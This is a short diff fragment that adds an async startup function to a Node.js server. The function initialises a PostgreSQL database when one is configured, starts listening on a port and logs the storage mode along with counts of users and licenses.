+async function startServer() {
+    // Initialize database if available
+    if (useDatabase) {
+        await initDatabase();
+    }
+
+    app.listen(PORT, () => {
+        console.log(`🚀 Server running on port ${PORT}`);
+        console.log(`💾 Storage mode: ${useDatabase ? 'PostgreSQL (PERMANENT — 100k users supported)' : 'File-based (set DATABASE_URL for permanent storage)'}`);
+        if (!useDatabase) {
+            console.log(`📁 Data directory: ${DATA_DIR}`);
+            console.log(`👥 Loaded ${users.length} users, ${licenses.length} licenses`);
+        }
+    });
+}
+
+startServer().catch(err => {
+    console.error('Failed to start server:', err);
+    process.exit(1);
 });
